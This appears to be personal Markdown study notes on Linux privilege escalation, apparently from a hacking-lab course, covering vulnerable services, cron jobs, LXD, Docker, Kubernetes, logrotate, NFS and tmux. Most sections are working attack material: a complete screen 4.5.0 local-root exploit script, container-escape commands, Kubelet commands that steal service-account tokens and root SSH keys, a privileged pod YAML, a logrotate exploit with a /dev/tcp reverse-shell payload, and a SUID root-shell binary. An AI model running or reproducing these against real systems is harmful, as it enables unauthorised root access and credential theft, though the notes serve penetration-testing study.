## Vulnerable Services
* Many running services may be exploitable 
### Example
### Screen version 4.5.0
```shell
screen -v 
```
#### Script:
```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```
## Cron Job Abuse
* Cron jobs can also be set run on time.
* `Crontab` command can create a cron file. This will be created by the cron daemon on the schedule specified.   
### Cronjob Entry 
| minutes | hours  | days | months | weeks | Meaning        |
| ------- | ------ | ---- | ------ | ----- | -------------- |
| `0`     | `*/12` | `*`  | `*`    | `*`   | Every 12 Hours |
 
* root crontab is only editable by the root user or a user with full sudo priviliges. 
* If you find world writable scripts that run as root in a crontab, you may be able to use these.
```shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
* use [pspy](https://github.com/DominicBreuker/pspy) to see if there is a cronjob running
```shell
./pspy64 -pf -i 1000
```
## Containers
* Operate at the OS system level and in virtual machines at the hardware level.
### LXC
* Linux Containers (LXC) is an operating system-level virtualisation technique
* Very popular due to their ease of user.
* By default LXC consume fewer resources than a virtual machine have a standard interface.
### LXD
* Linux Daemon is similar in some aspects but it is designed to contain a complete operating system. 
* Not an application contain but as such a system container.
### Exploit
* First check if we are in one of their groups
```shell
id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
* We can either create our own container or use an existing container. 
```shell
cd ContainerImages
ls
```
Templates often do not have passwords
```shell
lxc image import <template_name> --alias ubuntutemp
```
Verify import
```shell
lxc image list
```
Initiate the image and configure it by specifying the `security.privileged` flag. This flag disables all isolation
```shell
 lxc init ubuntutemp privesc -c security.privileged=true
```
Specify the root path for the container
```shell
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Start the container
```shell
lxc start privesc
```
```shell
 lxc exec privesc /bin/bash
```
```shell
ls -l /mnt/root
```
## Docker
* Open-source tool that provides a portable and consistent runtime enviromenet for software applications.
### Docker Architecture
#### Docker Daemon
* Also known as the docker server.
* Functions:
	* running Docker containers
	* Interacting with docker containers 
	* Managing Docker containers on the host system. 
##### Managing Docker Containers
* Core containerisation functionality
* Coordinates creation, execution and monitoring of Docker containers. 
	* This ensures all containers operate independently with their own file system.
##### Network and Storage 
* Facilitates container networking by creating virtual networks and managing interfaces. 
* Allows containers to communicate with each other and the outside world through network ports, IP address and DNS.
#### Docker Clients 
* Commands are issued through the Docker Client. 
* These communicate through the Docker Daemon through RESTful API or a UNIX socket. 
* Primary means of interacting with Docker. 
* Have the ability to create, start, stop and manage containers. 
##### Docker Desktop
* Provides a user-friendly GUI that simplifies the management of containers and their components. 
* It also support Kubernetes. 
#### Docker Images
* Blueprint or a template for creating containers
* encapsulates everything needed to run an application, including the applications code and dependencies. 
* A docker container is a instance of a docker image. 
* Images are immutable and `read-only` while containers are mutable and `can be modified`.
### Docker Priv Esc
#### Docker Shared Directories
* Shared directories (mounts) can bridge the gap between the host system and the containers filesystem.
* Useful for persisting data, sharing code and facilitating collaboration between environments  
* Shared directories can be mounted as read-only, modification in the container wont affect the host system. 

Look for non-standard docker libraries
```shell
cd /hostsystem/home/cry0l1t3
ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```
#### Docker Sockets
* Special file that allows us and processes to communicate with the docker daemon. 
* Access to docker sockets is typically restricted to specific users or user groups. 
* Exposing a docker socket over a network interface allows remote management. 
* The configuration files can contain very useful information that we can use to escape the docker container. 
```shell
ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

Use the [docker](https://master.dockerproject.org/linux/x86_64/docker) to interact with the socket and enumerate what docker contains are running. 
```shell
wget https://<ip>/docker -O docker
chmod +x docker
ls -l
```
```shell
/tmp/docker -H unix:///app/docker.sock ps
```
Create our own Docker Container than maps the host roots directory to the hostsystem. This gives us full access to the host system. 
```shell
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```
```shell
/tmp/docker -H unix:///app/docker.sock ps
```
Login to the new privileged Docker container
```shell
/tmp/docker -H unix:///app/docker.sock exec -it <container id> /bin/bash
```
Attempt to grab ssh keys or enumerate etc...
```shell
cat /hostsystem/root/.ssh/id_rsa
```
##### Is Docker Socket Writeable?
```shell
docker image ls
```
```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <repositry name> chroot /mnt bash
```
```shell
ls -l
```

#### Docker Group
```shell
id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```
Check if docker has a SUID, or if we are in the `sudoers` file to run Docker as root. 

See what images are running:
```shell
docker image ls
```
### Kubernetes
Also known as [K8s](https://kubernetes.io/)
#### What is it
##### Concept
* Revolves around the concept of pods, which can hold one or more closely connected containers. 
* Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname and other details. 
* Offers tools for load balancing, service discovery storage orchestration and self-healing. 
* Constantly developed with tools like `RBAC`
###### Differences with Docker 

| **Function** | **Docker**                       | **Kubernetes**                                |
| ------------ | -------------------------------- | --------------------------------------------- |
| `Primary`    | Platform for containerizing Apps | An orchestration tool for managing containers |
| `Scaling`    | Manual scaling with Docker swarm | Automatic scaling                             |
| `Networking` | Single network                   | Complex network with policies                 |
| `Storage`    | Volumes                          | Wide range of storage options                 |


##### The control Plane (master node)
* This is responsible for controlling the Kubernetes cluster
* Where the containerised applications are run
* Accommodates various needs 

| **Service**             | **TCP Ports**  |
| ----------------------- | -------------- |
| `etcd`                  | `2379`, `2380` |
| `API server`            | `6443`         |
| `Scheduler`             | `10251`        |
| `Controller Manager`    | `10252`        |
| `Kubelet API`           | `10250`        |
| `Read-Only Kubelet API` | `10255`        |
##### Minions (Worked Nodes)
* Server as a designated location for running applications.
* Each notes is managed and regulated by the control plane. 
* The `scheduler` understands the state of the cluster and schedules new pods on the nodes accordingly. 
##### K8s Security Measures 
* Cluster information Security 
* Cluster Configuration Security 
* Application Security 
* Data security 
##### Kubernetes API
* Core of the architecture is its API
* Servers as the main point of contact for all internal and external interactions. 
* Has been designed to support declarative control.
* `Kube-apiserver` is responsible for hosting the API.
* The API resource servers as an endpoint that houses a specific collection of API objects.

| **Request** | **Description**                                                |
| ----------- | -------------------------------------------------------------- |
| `GET`       | Retrieves information about a resource or a list of resources. |
| `POST`      | Creates a new resource.                                        |
| `PUT`       | Updates an existing resource.                                  |
| `PATCH`     | Applies partial updates to a resource.                         |
| `DELETE`    | Removes a resource.                                            |
##### Authentication 
* Supports a number of authentication methods such as certificates, tokens, Proxies, HTTP basic auth. 
* Once authenticated K8 enforces `RBAC`
* The Kublet can be configured to permit `anonymous access`
###### API Interaction
```shell
curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```
#### Interacting with 
##### Kubelet API - Extracting Pods
```shell
curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"nginx\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:ports": {
					...SNIP...
```
* This information includes, `names`, `namespaces`, `creation timestamps` and `container images` of the pods.
* The `last appiled configuration` can contain confidential information regarding the container images. 
* Identifying images and their versions used in the cluster can enable us to identify known vulnerabilities and exploit them.
* Name space information can provide insights into how the pods and resources are arranged within the cluster. 
* Use metadata such as `uid` and `resource verison` to perform reconnaissance and recognise targets for futher attacks.
##### Kubeletctl - Extracting Pods
```shell
kubeletctl -i --server 10.129.10.11 pods
```
##### Kubelet API - available commands
```shell
kubeletctl -i --server 10.129.10.11 scan rce
```
##### Kubelet API - executing commands 
```shell
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```
#### Privilege Escalation 
* Use a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain service account's token and certificates. 
##### Extracting Tokens
```shell
 kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
##### Extracting Certificates
```shell
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```
##### List Privileges
```shell
export token=`cat k8.token`
```
```shell
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
Look for privileges such as `get`, `create`, `list`
##### Create a new container
* If we can create a container, we can mount the entire root file system in the containers `/root`
###### Example YAML
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
###### Command
```shell
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```
##### Extracting Root SSH Keys
```shell
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
### Logrotate
* Linux systems produce a large number of log files.
* A tool called `logrotate` takes care of archiving or disposing of old logs 
##### Features of Logroate
* Managing the size of the log files
* their age
* the action to take when these factors are reached
#### Interacting with
```shell
cat /etc/logrotate.conf
```
##### Force a new rotation
set the date in: 
```shell
sudo cat /var/lib/logrotate.status
```
or use:
```shell
logrotate -f
```
##### Find corresponding configuration files
```shell
ls /etc/logrotate.d/
```

```shell
cat /etc/logrotate.d/dpkg
```
#### Exploit
##### Requirements:
* Need `write` permissions
* logrotate must run as privileged user or root
* Vulnerable versions
	* 3.8.6
	* 3.11.0
	* 3.15.0
	* 3.18.0
[Premade](https://github.com/whotwagner/logrotten)exploit
##### Using
```shell
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```
Create payload
```shell
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```
Work out which option lograte uses
```shell
 grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```
Run the exploit
Create:
```shell
./logrotten -p ./payload /tmp/tmp.log
```
Compress:
```shell
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```
### Miscellaneous Techniques 
#### Passive Traffic Capture
* if `tcpdump` is installed users may be able to capture network traffic, and as such may be able to get credentials in clear text.
* Tools can used to examine date being passed on the wire.
	* https://github.com/DanMcInerney/net-creds
	* https://github.com/lgandx/PCredz
#### Weak NFS Privileges
* Allows users to access shared files or directories
```shell
 showmount -e 10.129.2.12
```
When a volume is created these options can be set:

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|
```shell
cat /etc/exports
```

Can you make a binary that sets a suid?
```shell
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
```shell
gcc shell.c -o shell
```
```shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

#### Hijacking Tmux Sessions
* If your not working in a session you can detach it but still leave it active. 
##### Check for running Tmux Processes
```shell
 ps aux | grep tmux
```
Check Permissions
```shell
ls -la /<session name>
```
Attack to Tmux session
```shell
tmux -S /shareds
```
